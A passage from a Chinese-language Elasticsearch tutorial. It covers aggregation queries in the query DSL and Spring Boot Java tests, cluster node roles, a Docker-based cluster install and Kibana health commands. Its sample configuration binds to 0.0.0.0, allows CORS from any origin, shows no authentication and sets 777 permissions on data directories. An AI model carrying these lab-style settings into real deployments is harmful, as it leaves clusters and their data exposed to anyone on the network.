/jh\\_test/\\_doc/14  \n{\"name\":\"王五\",\"buyCount\":9,\"sex\":\"男\",\"createMonth\":\"2021-04\"}  \nPOST /jh\\_test/\\_doc/15  \n{\"name\":\"李四\",\"buyCount\":4,\"sex\":\"男\",\"createMonth\":\"2021-04\"}  \nPOST /jh\\_test/\\_doc/16  \n{\"name\":\"王五\",\"buyCount\":2,\"sex\":\"男\",\"createMonth\":\"2021-04\"}  \n  \n\n\n\n```\n\n聚合查询语法：\n\n```\n\n\n\"aggs\" : {  \n    \"<aggregation\\_name>\" : {                                 <!--聚合名称 -->  \n        \"<aggregation\\_type>\" : {                             <!--聚合类型 -->  \n            <aggregation\\_body>                               <!--聚合具体字段 -->  \n        }  \n        \\[,\"meta\" : {  \\[<meta\\_data\\_body>\\] } \\]?                <!--元信息 -->  \n        \\[,\"aggs\" : { \\[<sub\\_aggregation>\\]+ } \\]?       <!--子聚合 -->  \n    }  \n}  \n  \n\n\n\n```\n\n1.  **查询 buyCount 的总和**\n\n\n```\n\n\nGET /jh\\_test/\\_search  \n{  \n  \"size\":0,  \n  \"aggs\":{  \n    \"buyCountSum\":{  \n      \"sum\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n2.  **查询 2021-02 月 buyCount 的总和**\n\n\n```\n\n\n{  \n  \"size\":0,  \n   \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-02\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"buyCountSum\":{  \n      \"sum\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n3.  **查询 2021-03 月 buyCount 的最大值：**\n\n\n```\n\n\n{  \n  \"size\":0,  \n   \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-03\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"buyCountMax\":{  \n      \"max\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n4.  **查询 2021-03 月 buyCount 的最小值：**\n\n\n```\n\n\n{  \n  \"size\":0,  \n   \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-03\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"buyCountMin\":{  \n      \"min\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n  \n\n\n\n```\n\n5.  **同时查询 2021-03 月 buyCount 的最大值和最小值：**\n\n\n```\n\n\n{  \n  \"size\":0,  \n   \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-03\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"buyCountMax\":{  \n      \"max\": {  \n        \"field\": \"buyCount\"  \n      }  \n    },  \n     \"buyCountMin\":{  \n      \"min\": {  \n        \"field\": \"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n6.  **查询所有 name 的去重后的数量**\n\n\n```\n\n\n{  \n  \"size\":0,  \n  \"aggs\":{  \n    \"distinctName\":{  \n      \"cardinality\": {  \n        \"field\": \"name.keyword\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n7.  **查询 2021-04 月 name 的去重后的数量**\n\n\n```\n\n\n{  \n  \"size\":0,  \n  \"query\": {  \n\t\t\"term\": {   \n            \"createMonth\": \"2021-04\"   \n        }  \n\t},  \n  \"aggs\":{  \n    \"distinctName\":{  \n      \"cardinality\": {  \n        \"field\": \"name.keyword\"  \n      }  \n    }  \n  }  \n}  \n  \n\n\n\n```\n\n8.  **查询 BuyCount 的平均值**\n\n\n```\n\n\n{  \n    \"size\":\"0\",  \n    \"aggs\":{  \n        \"buyCountAvg\":{  \n            \"avg\":{  \n                \"field\":\"buyCount\"  \n            }  \n        }  \n    }  \n}  \n  \n\n\n\n```\n\n9.  **一次查询 总数，最大值，最小值，平均值，总和**\n\n\n```\n\n\n{  \n  \"size\":0,  \n  \"aggs\":{  \n    \"statsAll\":{  \n      \"stats\":{  \n        \"field\":\"buyCount\"  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n10.  **根据 createMonth 分组查询每个月的最大 buyCount**\n\n\n```\n\n\n{  \n    \"size\":0,  \n    \"aggs\": {  \n    \"createMonthGroup\": {  \n      \"terms\": {  \n        \"field\": \"createMonth\"  \n      },  \n      \"aggs\": {  \n        \"buyCountMax\": {  \n          \"max\": {  \n            \"field\": \"buyCount\"  \n          }  \n        }  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n11.  **查询每 createMonth 下，根据 sex 区分，统计buyCount 的平均值**\n\n\n```\n\n\n{  \n    \"size\":0,  \n    \"aggs\": {  \n    \"createMonthGroup\": {  \n      \"terms\": {  \n        \"field\": \"createMonth\"  \n      },  \n      \"aggs\": {  \n        \"sexGroup\": {  \n          \"terms\": {  \n            \"field\": \"sex\"  \n          },  \n          \"aggs\": {  \n                \"buyCountAvg\": {  \n                    \"avg\": {  \n                        \"field\": \"buyCount\"  \n                    }  \n                }  \n            }  \n        }  \n      }  \n    }  \n  }  \n}  \n\n\n\n```\n\n### 5.2.2 ES客户端实现聚合查询\n\n测试代码如下：\n\n```\n\n\n@SpringBootTest  \n@Slf4j  \npublic class AggregationTest {  \n  \n    @Resource  \n    ElasticsearchRestTemplate elasticsearchRestTemplate;  \n  \n    /\\*\\*  \n     \\* 查询 buyCount 的总和  \n     \\*/  \n    @Test  \n    void aggs1() {  \n        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(\"buyCountSum\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(buyCountSum)  \n//                .addAggregation(buyCountSum)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Sum sum = aggregations.get(\"buyCountSum\");  \n                log.info(\"计算 buyCount 总数：{} \", sum.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 查询 2021-02 月 buyCount 的总和：  \n     \\*/  \n    @Test  \n    void aggs2() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-02\");  \n        SumAggregationBuilder buyCountSum = AggregationBuilders.sum(\"buyCountSum\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(buyCountSum)  \n//                .addAggregation(buyCountSum)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Sum sum = aggregations.get(\"buyCountSum\");  \n                log.info(\"计算 buyCount 总数：{} \", sum.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 查询 2021-03 月 buyCount 的最大值：  \n     \\*/  \n    @Test  \n    void aggs3() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-03\");  \n        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(\"buyCountMax\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(buyCountMax)  \n//                .addAggregation(buyCountMax)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Max max = aggregations.get(\"buyCountMax\");  \n                log.info(\"计算 buyCount 最大值：{} \", max.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 查询 2021-03 月 buyCount 的最小值：  \n     \\*/  \n    @Test  \n    void aggs4() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-03\");  \n        MinAggregationBuilder buyCountMin = AggregationBuilders.min(\"buyCountMin\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(buyCountMin)  \n//                .addAggregation(buyCountMin)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Min min = aggregations.get(\"buyCountMin\");  \n                log.info(\"计算 buyCount 最小值：{} \", min.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 同时查询 2021-03 月 buyCount 的最大值和最小值：  \n     \\*/  \n    @Test  \n    void aggs5() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-03\");  \n        MaxAggregationBuilder buyCountMax = AggregationBuilders.max(\"buyCountMax\").field(\"buyCount\");  \n        MinAggregationBuilder buyCountMin = AggregationBuilders.min(\"buyCountMin\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(buyCountMax)  \n                .withAggregations(buyCountMin)  \n//                .addAggregation(buyCountMax)  \n//                .addAggregation(buyCountMin)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Max max = aggregations.get(\"buyCountMax\");  \n                log.info(\"计算 buyCount 最大值：{} \", max.getValue());  \n                Min min = aggregations.get(\"buyCountMin\");  \n                log.info(\"计算 buyCount 最小值：{} \", min.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 查询所有 name 的去重后的数量  \n     \\*/  \n    @Test  \n    void aggs6() {  \n        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(\"distinctName\").field(\"name.keyword\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(distinctName)  \n//                .addAggregation(distinctName)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Cardinality cardinality = aggregations.get(\"distinctName\");  \n                log.info(\"计算 name 的去重后的数量：{} \", cardinality.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\*  查询 2021-04 月 name 的去重后的数量  \n     \\*/  \n    @Test  \n    void aggs7() {  \n        QueryBuilder queryBuilder = QueryBuilders.termQuery(\"createMonth\", \"2021-04\");  \n        CardinalityAggregationBuilder distinctName = AggregationBuilders.cardinality(\"distinctName\").field(\"name.keyword\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withQuery(queryBuilder)  \n                .withAggregations(distinctName)  \n//                .addAggregation(distinctName)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Cardinality cardinality = aggregations.get(\"distinctName\");  \n                log.info(\"计算 name 的去重后的数量：{} \", cardinality.getValue());  \n            }  \n        }  \n    }  \n  \n  \n    /\\*\\*  \n     \\* 查询 BuyCount 的平均值  \n     \\*/  \n    @Test  \n    void aggs8() {  \n        AvgAggregationBuilder buyCountAvg = AggregationBuilders.avg(\"buyCountAvg\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(buyCountAvg)  \n//                .addAggregation(buyCountAvg)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Avg avg = aggregations.get(\"buyCountAvg\");  \n                log.info(\"计算 buyCount 的平均值：{} \", avg.getValue());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 一次查询 总数，最大值，最小值，平均值，总和  \n     \\*/  \n    @Test  \n    void aggs9() {  \n        StatsAggregationBuilder stats = AggregationBuilders.stats(\"stats\").field(\"buyCount\");  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(stats)  \n//                .addAggregation(stats)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Stats s = aggregations.get(\"stats\");  \n                log.info(\"计算 buyCount 的 count：{} \", s.getCount());  \n                log.info(\"计算 buyCount 的 min：{} \", s.getMin());  \n                log.info(\"计算 buyCount 的 max：{} \", s.getMax());  \n                log.info(\"计算 buyCount 的 avg：{} \", s.getAvg());  \n                log.info(\"计算 buyCount 的 sum：{} \", s.getSum());  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\* 根据 createMonth 分组查询每个月的最大 buyCount  \n     \\*/  \n    @Test  \n    void aggs10() {  \n        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(\"createMonthGroup\").field(\"createMonth\")  \n                .subAggregation(AggregationBuilders.max(\"buyCountMax\").field(\"buyCount\"));  \n  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(createMonthGroup)  \n//                .addAggregation(createMonthGroup)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Terms terms = aggregations.get(\"createMonthGroup\");  \n                terms.getBuckets().forEach(bucket -> {  \n                    String createMonth = bucket.getKeyAsString();  \n                    Aggregations subAggs = bucket.getAggregations();  \n                    if (Objects.nonNull(subAggs)) {  \n                        Max max = subAggs.get(\"buyCountMax\");  \n                        log.info(\"计算 {} 月的最大值为：{} \", createMonth, max.getValue());  \n                    }  \n                });  \n            }  \n        }  \n    }  \n  \n    /\\*\\*  \n     \\*  查询每 createMonth 下，根据 sex 区分，统计buyCount 的平均值  \n     \\*/  \n    @Test  \n    void aggs11() {  \n        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(\"createMonthGroup\").field(\"createMonth\")  \n                .subAggregation(AggregationBuilders.terms(\"sexGroup\").field(\"sex\")  \n                        .subAggregation(AggregationBuilders.avg(\"buyCountAvg\").field(\"buyCount\")));  \n  \n        Query query = new NativeSearchQueryBuilder()  \n                .withAggregations(createMonthGroup)  \n//                .addAggregation(createMonthGroup)  \n                .build();  \n        SearchHits<JhTestEntity> search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  \n        if (search.hasAggregations()) {  \n            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  \n            if (Objects.nonNull(aggregations)) {  \n                Terms terms = aggregations.get(\"createMonthGroup\");  \n                terms.getBuckets().forEach(bucket -> {  \n                    String createMonth = bucket.getKeyAsString();  \n                    Aggregations sexAggs = bucket.getAggregations();  \n                    if (Objects.nonNull(sexAggs)) {  \n                        Terms sexTerms = sexAggs.get(\"sexGroup\");  \n                        sexTerms.getBuckets().forEach(sexBucket -> {  \n                            String sex = sexBucket.getKeyAsString();  \n                            Aggregations avgAggs = sexBucket.getAggregations();  \n                            if (Objects.nonNull(avgAggs)) {  \n                                Avg avg = avgAggs.get(\"buyCountAvg\");  \n                                log.info(\"计算 {} 月，{} 性 的平均值为：{} \", createMonth, sex, avg.getValue());  \n                            }  \n                        });  \n                    }  \n                });  \n            }  \n        }  \n    }  \n  \n}  \n  \n\n\n\n```\n\n5.3 ES ES工业级Java 应用开发\n---------------------\n\n一般不会直接使用RestHighLevelClient对于ES操作，因为语法过于繁琐，重复，基于分离变和不变的原则可以进行工业级封装。\n\nhttp://localhost:8080/doc.html\n\n![](./2024/06/16/ES从入门到精通/22.png)\n工业级封装后的Service：\n\n> 文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》\n\n6 ES集群架构\n========\n\n6.1 ES集群的5大角色\n-------------\n\n1.  **Master Node ：主节点**\n\n\n主节点，该节点不和应用创建连接，每个节点都保存了集群状态。master节点控制整个集群的元数据。只有Master Node节点可以修改节点状态信息，及元数据(metadata)的处理。 元数据(metadata)，比如：\n\n*   索引的分片信息 、主副本信息\n\n*   分片的节点分配信息，路由分配\n\n*   index 、type、Mapping\n\n*   Setting 配置等等。\n\n\n从资源占用的角度来说：master节点不占用磁盘IO和CPU，内存使用量一般， 没有data 节点高类似于kafa中的 controller，负责集群元数据的管理和维护\n\n2.  **Master eligible nodes ：合格节点** 有资格成为Master节点但暂时并不是Master的节点被称为 eligible 节点，该节点可以参加选主流程，成为Master节点. 该节点只是与集群保持心跳，判断Master是否存活，如果Master故障则参加新一轮的Master选举。 从资源占用的角度来说：eligible节点比Master节点更节省资源，因为它还未成为 Master 节点， 只是有资格成功Master节点。\n\n3.  **Data Node ：数据节点** 职责： 数据节点，用于建立文档索引，管理shard。 类似于rocket 中的 broker，负责数据的管理和维护，数据节点职责：\n\n\n*   该节点用于建立文档索引， 接收 应用创建连接、接收索引请求\n\n*   查询，接收用户的搜索请求\n\n\ndata节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消 耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 数据节点：保存包含索引文档的分片数据，执行CRUD、搜索、聚合相关的操作。属于：内存、CPU、IO密集型，对硬件资源要求高。 从资源占用的角度来说：data节点会占用大量的CPU、IO和内存\n\n4.  **Coordinating Node ：协调节点(/路由节点/client节点)**\n\n\n协调节点，该节点专用与接收应用的查询连接、接受搜索请求，但其本身不负责存储数据 协调节点，接受客户端搜索请求后将请求转发到与查询条件相关的多个data节点的分片上，然后多个data节点的分片执行查询语句或者查询结果再返回给协调节点，协调节点把各个data节点的返回结果进行整合、排序等一系列操作后再将最终结果返回给用户请求。 data节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 搜索请求在两个阶段中执行（query 和 fetch），这两个阶段由接收客户端请求的节点 - 协调节点协调。\n\n*   在请求query 阶段，协调节点将请求转发到保存数据的数据节点。每个数据节点在本地执行请求并将其结果返回给协调节点。\n\n*   在收集fetch阶段，协调节点将每个数据节点的结果汇集为单个全局结果集。\n\n\n从资源占用的角度来说：协调节点，可当负责均衡节点，该节点不占用io、cpu和内存 总结：Coordinating 大致的职责 ： 请求分发、结果的合并\n\n5.  **Ingest Node ：ingest节点**\n\n\ningest 节点可以看作是数据前置处理转换的节点，支持 pipeline管道 设置，可以使用 ingest 对数据进 行过滤、转换等操作，类似于 logstash 中 filter 的作用，功能相当强大。 Ingest节点处理时机——在数据被索引之前，通过预定义好的处理管道对数据进行预处理。默认情况下，所有节点都启用Ingest，因此任何节点都可以处理Ingest任务。 当然，我们也可以创建专用的Ingest节点。\n\n6.  **部落（tribe）**\n\n\n接着说一下ES里面的部落：tribe， 可以在查询过程中链接两个集群的数据，查询的数据将会汇总到tribe节点，有tribe节点对数据进行整合再发送给client； tribe还可以写数据，但是这里有一个限制，就是写的索引只能是一个集群所有；如果写入两个集群同名索引，那么只能成功写入一个，至于写入哪一个可以通过配置偏好实现。 可以通过配置指明tribe只能读，不能写。\n\n6.2 ES集群节点角色配置\n--------------\n\n```\n\n\n1. node.master  \n2. node.data  \n3. node.ingest  \n\n\n\n```\n\n配置实例/usr/share/elasticsearch/config/elasticsearch.yml\n\n```\n\n\nbootstrap.memory\\_lock: true  \ncluster.name: \"es-cluster\"  \nnode.name: master1  \nnode.master: true  \nnode.data: true  \nnetwork.host: 0.0.0.0  \nhttp.port: 9200  \ntransport.tcp.port: 9300  \ncluster.initial\\_master\\_nodes: \\[\"master1\"\\]  \ndiscovery.zen.ping.unicast.hosts: master1, master2, master3  \n#官方推荐 master-eligible nodes / 2 + 1 向下取整的个数  \ndiscovery.zen.minimum\\_master\\_nodes: 2  \npath.logs: /usr/share/elasticsearch/logs  \nhttp.cors.enabled: true  \nhttp.cors.allow-origin: \"\\*\"  \nxpack.security.audit.enabled: true  \n\n\n\n```\n\n默认情况下这三个属性的值都是true，实际上，一个节点在默认情况下会同时扮演：Master Node，Data Node 和 Ingest Node。\n\n| **节点类型** | **配置参数** | **默认值** |\n| --- | --- | --- |\n|Master Eligible| node.master| true|\n| Data| node.data| true|\n| Coordinating only| 无| \n\n设置上面2 个参数全为 false，节点为专用协调节点\n\n|| Ingest| node.ingest| true|\n\n6.3 ES节点配置组合\n------------\n\n1.  **组合1**\n\n\n```\n\n\nnode.master: true   \nnode.data: true   \nnode.ingest: true  \n\n\n\n```\n```\n\n\n这种组合表示这个节点既有成为主节点的资格，又可以存储数据，还可以作为预处理节点这个时候如果某个节点被选举成为了真正的主节点，那么他还要存储数据，这样对于这个节点的压力就比较大了。  \nelasticsearch 默认是：每个节点都是这样的配置，在测试环境下这样做没问题。实际工作中建议不要这  \n\n\n\n```\n\n样设置，这样相当于 主节点 和 数据节点 的角色混合到一块了。\n\n2.  **组合2**\n\n\n```\n\n\nnode.master: false   \nnode.data: true   \nnode.ingest: false  \n\n\n\n```\n\n这种组合表示这个节点没有成为主节点的资格，也就不参与选举，只会存储数据。这个节点我们称为 data(数据)节点。在集群中需要单独设置几个这样的节点负责存储数据。后期提供存储和查询服务\n\n3.  **组合3**\n\n\n```\n\n\nnode.master: true  \nnode.data: false  \nnode.ingest: false  \n\n\n\n```\n\n这种组合表示这个节点不会存储数据，有成为主节点的资格，可以参与选举，有可能成为真正的主节点。这个节点我们称为master节点\n\n4.  **组合4**\n\n\n```\n\n\nnode.master: false   \nnode.data: false   \nnode.ingest: true  \n\n\n\n```\n\n这种组合表示这个节点即不会成为主节点，也不会存储数据，这个节点的意义是作为一个 client(客户端)节点，主要是针对海量请求的时候可以进行负载均衡。 在新版 ElasticSearch5.x 之后该节点称之为：coordinate 节点，其中还增加了一个叫：ingest 节点，用 于预处理数据（索引和搜索阶段都可以用到）。 当然，作为一般应用是不需要这个预处理节点做什么额外的预处理过程，那么这个节点和我们称之为client 节点之间可以看做是等同的，我们在代码中配置访问节点就都可以配置这些 ingest 节点即可。‍\n\n6.4 高可用ES的部署架构\n--------------\n\n![](./2024/06/16/ES从入门到精通/23.png)\n1.  **小型的ES集群（<10）的节点架构**\n\n\n![](./2024/06/16/ES从入门到精通/24.png)\n*   对于Ingest转换节点，如果我们没有格式转换、类型转换等需求，直接设置为false。\n\n*   3-5个节点属于轻量级集群，要保证主节点个数满足((节点数/2)+1)。\n\n*   轻量级集群，节点的多重属性如：Master&Data设置为同一个节点可以理解的。\n\n*   如果进一步优化，5节点可以将Master和Data再分离。\n\n\n2.  **中型的ES集群（10-50）的节点架构**\n\n\n*   三台服务器做master节点 （可选）\n\n*   N（比如20）台服务器作为data节点（存储资源要大）\n\n*   N（比如5）台做coodinate/ingest节点（用于搜索结果合并，可以提高ES查询效率）\n\n\n![](./2024/06/16/ES从入门到精通/25.png)\n3.  **超大型的ES集群的节点架构（150个节点+）**\n\n\n可以按照100个节点为单位，分成多个集群，通过 tribenode连接，单个ES数据库最好的高可用集群部署架构为：每个集群，三台服务器做master节点\n\n*   N（比如50）台服务器作为data节点（存储资源要大）\n\n*   N（比如5）台做coodinate节点（用于搜索结果合并，可以提高ES查询效率）\n\n*   N（比如2）台做ingest节点（用于数据转换，可以提高ES索引效率）\n\n\n![](./2024/06/16/ES从入门到精通/26.png)\n6.5 小型ES集群的安装\n-------------\n\n### 6.5.1 Image镜像\n\n有外网环境，拉取镜像代码如下：\n\n```\n\n\n#下载elasticsearch,带中文分词器的版本  \ndocker pull andylsr/elasticsearch-with-ik-icu:7.14.0  \n#下载kibana  \ndocker pull docker.elastic.co/kibana/kibana:7.14.0  \n\n\n\n```\n\n无外网环境，可以先从有公网的环境拉取镜像，然后导出镜像\n\n```\n\n\ndocker save andylsr/elasticsearch-with-ik-icu:7.14.0 -o /root/elasticsearchwith-ik-icu.tar  \ndocker save docker.elastic.co/kibana/kibana:7.14.0 -o /root/kibana.tar  \n\n\n\n```\n\n然后上传导出的de镜像到dao目标虚拟机，然后导入镜像到docker\n\n```\n\n\ndocker load -i /vagrant/3G-middleware/elasticsearch-with-ik-icu.tar  \ndocker load -i /vagrant/3G-middleware/kibana.tar  \ndocker load -i /vagrant/3G-middleware/haproxy.tar  \n\n\n\n```\n\n### 6.5.2 创建目录结构\n\n```\n\n\nmkdir -p /home/docker-compose/elasticsearch7/{coordinate1,coordinate2}-{logs,data}  \nmkdir -p /home/docker-compose/elasticsearch7/{master1,master2,master3}-{logs,data}  \nchmod -R 777 /home/docker-compose/elasticsearch7  \n\n\n\n```\n\n### 6.5.3 安装ES集群\n\n把docker-compose和ES相应配置文件拷贝到`/home/docker-compose`目录下，执行如下命令安装ES集群\n\n```\n\n\ndocker-compose --compatibility up -d # 兼容模式后台启动  \n\n\n\n```\n\n*   \\--compatibility：表示已兼容模式启动容器\n\n*   \\-d：表示后台启动\n\n\n6.6 使用kibana访问集群\n----------------\n\n1.  **查看集群健康情况**\n\n\n```\n\n\nGET \\_cat/health?v  \n\n\n\n```\n\n结果：\n\n```\n\n\nepoch      timestamp cluster    status node.total node.data shards pri relo init unassign pending\\_tasks max\\_task\\_wait\\_time active\\_shards\\_percent  \n1670418184 13:03:04  es-cluster green           5         3     16   8    0    0        0             0                  -                100.0%  \n  \n\n\n\n```\n\nstatus选项的值\n\n*   green : 所有primary shard和replica shard都已成功分配, 集群是100%可用的\n\n*   yellow : 所有primary shard都已成功分配, 但至少有一个replica shard缺失. 此时集群所有功能都正常使用, 数据不会丢失, 搜索结果依然完整, 但集群的可用性减弱. —— 需要及时处理的警告\n\n*   red : 至少有一个primary shard(以及它的全部副本分片)缺失 —— 部分数据不能使用, 搜索只能返回部分数据, 而分配到这个分配上的写入请求会返回一个异常. 此时虽然可以运行部分功能, 但为了索引数据的完整性, 需要尽快修复集群\n\n\n2.  **查看集群中的节点个数**\n\n\n```\n\n\nGET \\_cat/nodes?v  \n\n\n\n```\n```\n\n\nip         heap.percent ram.percent cpu load\\_1m load\\_5m load\\_15m node.role   master name  \n172.19.0.2           36          95  12    0.20    0.43     0.73 cdfhilmrstw -      master2  \n172.19.0.7           75          95  12    0.20    0.43     0.73 cdfhilmrstw \\*      master3  \n172.19.0.5           29          95  12    0.20    0.43     0.73 cdfhilmrstw -      master1  \n172.19.0.6           64          96  12    0.20    0.43     0.73 lr          -      coordinate2  \n172.19.0.3           23          96  12    0.20    0.43     0.73 lr          -      coordinate1  \n\n\n\n```\n\n*   第一列（ip）：es节点ip\n\n*   第二列（heap.percent）：堆内存占比\n\n*   第三列（ram.percent）：内存使用占比\n\n*   第四列（cpu）：cpu使用率\n\n*   第五列（load\\_1m）：1分钟内平均load情况\n\n*   第六列（load\\_5m）：5分钟内平均load情况\n\n*   第七列（load\\_15m）：15分钟内平均load情况\n\n*   第八列（node.role）：节点权限\n\n*   第九列（master）：是否master节点，\\*为master节点\n\n*   第十列（name）：节点名称\n\n\n**（1）heap.percent** 表示ES使用的JVM内存情况，该值应该低于75，如果长时间大于75，表示JVM内存配置不够，如果JVM已经配置到30G，则表示该Datanode节点上的压力较大，需要考虑增加Datanode节点来分摊压力 **（2）ram.percent** 表示机器上内存的使用情况，实际对应linux上的 used+cache内存使用情况，如果该值接近100%，则表示机器上cache内存不够用，主要是由于ES检索中，lucene会消耗大量cache内存，如果cache不够，会导致lucene无法将部分文件加载到cache中，会频繁从磁盘中进行读取，导致查询延时加大\n\n3.  **查看集群中的索引**\n\n\n```\n\n\nGET \\_cat/indices?v  \n\n\n\n```\n```\n\n\nhealth status index                           uuid                   pri rep docs.count docs.deleted store.size pri.store.size  \ngreen  open   .kibana-event-log-7.14.0\\-000001 1uw627v6T8KPBv2xrlPlPQ   1   1          9            0     97.8kb         48.9kb  \ngreen  open   .kibana\\_7.14.0\\_001              1G2WGiXOT2Wvux7R\\_5TuLA   1   1         86           14      4.9mb          2.7mb  \ngreen  open   .apm-custom-link                dMukcWA2QVOFzsOhWiPOng   1   1          0            0       416b           208b  \ngreen  open   .apm-agent-configuration        ReYFH-LaQbmWjGTwif0nHA   1   1          0            0       416b           208b  \ngreen  open   .kibana\\_task\\_manager\\_7.14.0\\_001 H-3hQBgZRO2AfYsWLS6LQw   1   1         14         1275    622.9kb        337.1kb  \ngreen  open   user                            HdrFzj7TQ\\_ejXe\\_9Xdx1LQ   1   1          6            2     37.4kb         17.4kb  \ngreen  open   .tasks                          DudUNrFYTq24R7ZY9IFK5A   1   1         16            0     80.9kb         43.4kb  \n  \n\n\n\n```\n\n7 数据类型和映射\n=========\n\n7.1 映射的创建\n---------\n\n和传统数据库不同，传统的数据库我们尝试向表中插入数据的前提是这个表已经存在数据结构的定义，且插入数据的字段要在表结构中被定义。 而ES的映射的创建支持主动和被动创建。\n\n1.  **被动创建（动态映射）**\n\n\n此时字段和映射类型不需要事先定义，只需要存在文档的索引，当向此索引添加数据的时候当遇到不存在的映射字段，ES会根据数据内容自动添加映射字段定义。\n\n2.  